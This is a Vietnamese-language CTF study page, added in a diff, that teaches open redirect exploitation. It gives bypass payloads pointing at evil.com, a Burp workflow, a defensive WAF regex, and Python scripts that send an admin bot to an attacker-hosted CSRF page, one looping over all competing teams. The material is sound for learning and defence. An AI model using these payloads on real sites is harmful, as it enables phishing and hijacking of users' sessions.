@@ -1,0 +1,425 @@
+<title>Open Redirect — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · CSRF, CORS, Redirect</div>
+    <h1>Open Redirect</h1>
+    <p class="sub">Khi tham số <code>?url=</code>/<code>?next=</code>/<code>?redirect=</code> cho phép trỏ ra
+    bất kỳ domain nào — tự nó ít khi cho điểm trực tiếp, nhưng là <strong>mắt xích</strong> quan trọng: dùng để
+    đưa admin bot "đi lạc" ra ngoài, hoặc làm bước trung gian trong chuỗi SSRF/OAuth.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Open Redirect là gì, để làm gì?</h2>
+  <p class="lead">Nhiều trang có chức năng "sau khi đăng nhập, quay về trang trước đó" — lưu URL đích trong tham
+  số (vd <code>?next=/dashboard</code>), rồi dùng nó để redirect. Nếu app không kiểm tra URL đích có thuộc chính
+  domain mình không, bạn đổi thành <code>?next=https://evil.com</code> — link trông như của domain thật (vì bắt
+  đầu đúng domain đó) nhưng cuối cùng đưa người bấm sang trang khác hoàn toàn.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Open Redirect <strong>hiếm khi tự nó đủ điểm</strong> — giá trị thật nằm ở việc <strong>kết hợp</strong>: (1)
+  "ngụy trang" link độc trông như link thật của domain tin cậy để lừa admin bot/nạn nhân bấm, hoặc (2) làm bước
+  trung gian để vượt whitelist domain trong 1 lỗ hổng khác (SSRF check domain ban đầu nhưng không check sau khi
+  redirect — xem bài SSRF mục 06.B).</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ OPEN REDIRECT</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        URL có tham số <code>?url=</code>, <code>?next=</code>, <code>?redirect=</code>,
+        <code>?return_to=</code>, <code>?continue=</code>. Thử đổi thành domain ngoài (vd
+        <code>https://example.com</code>) → nếu trình duyệt thực sự chuyển sang trang đó ⟹ xác nhận.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Thường cần kết hợp với mục tiêu khác (gửi link cho admin bot, hoặc 1 bước trong chuỗi SSRF/OAuth) — ít
+        khi tự nó là lời giải hoàn chỉnh.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: đổi giá trị tham số redirect, Send, xem header <code>Location</code> trong Response (status
+        3xx) có trỏ đúng ra domain bạn đưa vào không.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># Cơ bản</span>
+?next=https://evil.com
+<span class="c"># Vượt whitelist kiểm tra domain bắt đầu bằng "/"</span>
+?next=//evil.com
+<span class="c"># Vượt whitelist kiểm tra CÓ CHỨA domain thật</span>
+?next=https://real-target.com.evil.com
+?next=https://evil.com/real-target.com
+<span class="c"># Vượt kiểm tra ký tự @ (phần trước @ chỉ là username, browser bỏ qua)</span>
+?next=https://real-target.com@evil.com</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+r = requests.get(<span class="s">"http://TARGET/login"</span>, params={<span class="s">"next"</span>: <span class="s">"https://evil.com"</span>}, allow_redirects=<span class="k">False</span>)
+<span class="k">print</span>(r.status_code, r.headers.get(<span class="s">"Location"</span>))</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Tự thân ít điểm — luôn tự hỏi "redirect này giúp gì cho mục tiêu lớn hơn" (lừa bot, bypass whitelist).
+        WAF rule nhanh: chặn giá trị tham số redirect bắt đầu bằng <code>http</code>/<code>//</code> trỏ ra ngoài
+        domain chính. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>HTTP redirect</b> — server trả status <code>3xx</code> (thường 302) kèm header
+  <code>Location: &lt;url đích&gt;</code>, trình duyệt tự động chuyển sang URL đó mà không cần người dùng bấm gì
+  thêm.</div>
+  <div class="def"><b>Protocol-relative URL</b> — URL bắt đầu bằng <code>//</code> (không có <code>http:</code>)
+  — trình duyệt tự hiểu là "dùng cùng giao thức hiện tại, nhưng đổi domain", dễ bị bỏ sót nếu bộ lọc chỉ kiểm tra
+  chuỗi "http" ở đầu.</div>
+  <p>Code hay viết (thiếu kiểm tra domain đích):</p>
+  <pre><code><span class="c"># Python/Flask</span>
+next_url = request.args.get(<span class="s">'next'</span>, <span class="s">'/'</span>)
+<span class="k">return</span> redirect(next_url)   <span class="c"># không kiểm tra next_url có thuộc domain mình không</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Tin tưởng tham số redirect do chính người dùng cung cấp</h2>
+  <p>Tính năng "quay về trang trước" vốn để tiện cho người dùng — lập trình viên ít khi nghĩ tới việc tham số đó
+  cũng là input cần kiểm tra như mọi input khác. Cách vá đúng là chỉ chấp nhận <strong>đường dẫn tương đối</strong>
+  (bắt đầu bằng <code>/</code> nhưng không phải <code>//</code>) hoặc so khớp domain đích với whitelist — bước
+  này rất hay bị bỏ qua hoặc làm sai (chỉ check <code>startswith</code>/<code>contains</code> thay vì parse URL
+  đúng cách).</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Vì sao link "trông như thật" lại lừa được người/bot</h2>
+  <div class="pbreak">
+    <div class="ph">https://target-that-victim-trusts.com/login?next=https://evil.com/phish</div>
+    <div class="pb">
+      <div class="part">Phần đầu URL (<code>https://target-that-victim-trusts.com/login</code>) là domain THẬT,
+      hợp lệ — nạn nhân/bot kiểm tra bằng mắt (hoặc hệ thống tự động kiểm tra domain trước khi "cho phép mở
+      link") đều thấy đúng domain tin cậy.</div>
+      <div class="part">Nhưng sau khi tải xong trang login thật, server tự redirect sang
+      <code>https://evil.com/phish</code> — nạn nhân/bot đã "rời khỏi" domain thật mà không nhận ra ngay, vì toàn
+      bộ hành động chỉ là bấm vào 1 link trông hợp lệ.</div>
+    </div>
+    <div class="resp"><b>Ứng dụng trong CTF:</b> dùng chính link <code>target.com/...?next=evil.com</code> (không
+    phải link evil.com trần trụi) để báo cho admin bot — một số hệ thống report URL có kiểm tra domain đầu vào
+    phải thuộc chính app, open redirect giúp "qua mặt" bước kiểm tra này.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>URL có <code>?next=</code>, <code>?redirect=</code>, <code>?url=</code>, <code>?return_to=</code> sau trang login/logout</td><td>Bề mặt Open Redirect kinh điển</td></tr>
+    <tr><td>Chức năng "report URL cho bot" chỉ chấp nhận URL thuộc domain chính</td><td>Gợi ý cần Open Redirect để "ngụy trang" link thật (kết hợp XSS/CSRF/CORS)</td></tr>
+    <tr><td>OAuth flow có tham số <code>redirect_uri</code></td><td>Khả năng leak authorization code/token qua redirect_uri không được validate đúng (xem thêm bài OAuth nếu có)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Xác nhận bằng Repeater, quan sát header Location</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request có tham số redirect, Send to Repeater.</li>
+    <li>Sửa giá trị thành domain ngoài, Send.</li>
+    <li>Xem Response: status 3xx + header <code>Location</code> đúng domain ngoài ⟹ xác nhận. Lưu ý Burp
+    Repeater mặc định <strong>không tự follow redirect</strong> — bạn thấy ngay response gốc, không cần tắt gì
+    thêm.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Vượt các kiểu whitelist hay gặp</h2>
+  <table>
+    <tr><th>App check (sai)</th><th>Bypass bằng</th></tr>
+    <tr><td>Chỉ chặn domain bắt đầu bằng <code>http</code></td><td><code>//evil.com</code> (protocol-relative)</td></tr>
+    <tr><td><code>url.startswith('https://target.com')</code></td><td><code>https://target.com.evil.com</code>, <code>https://target.com@evil.com</code></td></tr>
+    <tr><td><code>url.includes('target.com')</code></td><td><code>https://evil.com/?x=target.com</code>, <code>https://evil.com/target.com</code></td></tr>
+    <tr><td>Chặn ký tự <code>:</code> và <code>//</code> trong tham số</td><td>URL-encode: <code>%2F%2Fevil.com</code>, hoặc dùng domain không cần <code>//</code> nếu framework redirect tự thêm scheme</td></tr>
+    <tr><td>Chỉ check domain, không check path traversal ngược (hiếm)</td><td><code>https://target.com/\@evil.com</code> (một số parser URL hiểu <code>\</code> như <code>/</code>)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: KHO PAYLOAD</div>
+  <h2>Không cần công cụ riêng — chủ yếu là kho payload + tư duy kết hợp</h2>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Open Redirect/</code> — nhiều biến thể bypass hơn bảng mục 06. Open
+  Redirect không có công cụ tự động chuyên dụng vì bản chất đơn giản (1 tham số, 1 header Location) — giá trị
+  nằm ở việc <strong>nghĩ ra cách kết hợp</strong> với bài khác (XSS/CSRF/CORS cần report URL, hoặc SSRF mục 06.B).</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/login"</span>
+r = requests.get(url, params={<span class="s">"next"</span>: <span class="s">"https://evil-test.com"</span>}, allow_redirects=<span class="k">False</span>)
+<span class="k">print</span>(r.status_code, r.headers.get(<span class="s">"Location"</span>))   <span class="c"># xác nhận trỏ đúng ra domain ngoài</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — kết hợp report URL cho bot (giống bài XSS/CSRF)</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="c"># Dùng chính domain target để "ngụy trang" link report cho bot, thực chất chuyển hướng tới trang độc</span>
+disguised_url = <span class="s">"http://TARGET/login?next=http://YOUR_IP:8000/csrf.html"</span>
+requests.post(<span class="s">"http://TARGET/report"</span>, data={<span class="s">"url"</span>: disguised_url})</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> requests
+
+MY_IP = <span class="s">"10.10.X.X"</span>
+
+<span class="k">def</span> <span class="d">exploit_redirect_combo</span>(host):
+    <span class="k">try</span>:
+        disguised = <span class="s">f"http://{host}/login?next=http://{MY_IP}:8000/"</span>
+        requests.post(<span class="s">f"http://{host}/report"</span>, data={<span class="s">"url"</span>: disguised}, timeout=5)
+        <span class="k">return</span> <span class="k">True</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">False</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        exploit_redirect_combo(host)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Khi kết hợp với bài khác</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Phát hiện</div><div class="d">Form "Report to admin" chỉ chấp nhận URL bắt đầu bằng domain <code>TARGET.com</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Tìm Open Redirect</div><div class="d">Trang login có <code>?next=</code> không kiểm tra domain đích ⟹ xác nhận Open Redirect.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Ngụy trang link XSS/CSRF</div><div class="d">Report URL: <code>http://TARGET.com/login?next=http://YOUR_IP:8000/csrf.html</code> — qua được bộ lọc domain vì bắt đầu đúng <code>TARGET.com</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Bot bị chuyển hướng</div><div class="d">Bot mở link, server TARGET.com redirect ngay sang trang CSRF/XSS độc của bạn.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Phần còn lại giống hệt bài XSS/CSRF đã học — Open Redirect chỉ là "chìa khóa mở cửa" bước report.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi giá trị tham số redirect)</th><th>Khớp gì</th></tr>
+    <tr><td><code>^(https?:)?//(?!TARGET\.com)</code></td><td>Giá trị bắt đầu bằng URL tuyệt đối/protocol-relative trỏ ra NGOÀI domain chính (thay <code>TARGET.com</code> bằng domain thật)</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu chức năng redirect hợp lệ CẦN trỏ ra ngoài
+  (vd link thanh toán qua cổng bên thứ ba), rule này sẽ chặn nhầm — xác nhận đúng mục đích chức năng trước khi
+  áp dụng.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Mọi domain ngoài đều bị ép về <code>/</code></td><td>App có validate đúng, chỉ chấp nhận path tương đối</td><td>Không khai thác được Open Redirect ở đây, nhưng vẫn kiểm tra kỹ các bypass mục 06 trước khi kết luận</td></tr>
+    <tr><td>Tìm được Open Redirect nhưng không biết dùng để làm gì</td><td>Chưa xác định được bài nào cần "ngụy trang URL" để kết hợp</td><td>Xem lại các chức năng report-URL/redirect_uri trong challenge — Open Redirect gần như luôn đi kèm 1 nhu cầu cụ thể khác</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Tham số redirect không kiểm tra domain đích, VÀ có nhu cầu kết hợp (report URL bị giới hạn domain, hoặc whitelist SSRF/OAuth).</td></tr>
+    <tr><td>❌</td><td>App chỉ chấp nhận path tương đối bắt đầu bằng <code>/</code> và validate đúng (không cho <code>//</code>).</td></tr>
+    <tr><td>❌</td><td>Không có nhu cầu kết hợp nào (không có report URL, không có whitelist khác cần bypass) — tự thân Open Redirect gần như không cho điểm trực tiếp trong CTF.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay, kết hợp Open Redirect với CSRF PoC đã học ở bài
+  trước.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ test riêng Open Redirect trước (xác nhận header Location đúng)
+  rồi mới ghép vào URL report, tránh nhầm lẫn lỗi ở bước nào.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> form report chặn domain bằng <code>url.startswith('http://TARGET.com')</code>.
+  Tìm Open Redirect vượt được check này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>URL redirect VẪN bắt đầu đúng <code>http://TARGET.com</code> (qua được
+  check), chỉ khác ở việc nó TỰ CHUYỂN HƯỚNG sau khi tải — check domain ban đầu không có nghĩa không bị redirect
+  tiếp.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> không tìm thấy chức năng report URL nào trong challenge. Nghĩ 1 cách khác
+  Open Redirect vẫn có giá trị dù không có admin bot.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Kiểm tra app có dùng chính tham số redirect này trong 1 luồng OAuth/SSO
+  nội bộ nào không — leak token qua <code>redirect_uri</code> là trường hợp Open Redirect vẫn tự có giá trị mà
+  không cần bot.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Open Redirect</td><td>Lỗ hổng cho phép điều hướng người dùng/bot tới domain tùy ý qua tham số không được kiểm tra.</td></tr>
+    <tr><td>Protocol-relative URL</td><td>URL dạng <code>//domain.com</code>, trình duyệt tự thêm giao thức hiện tại.</td></tr>
+    <tr><td>redirect_uri (OAuth)</td><td>Tham số trong luồng OAuth chỉ định nơi gửi lại authorization code/token sau khi xác thực.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Open Redirect/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("redirect-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("redirect-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
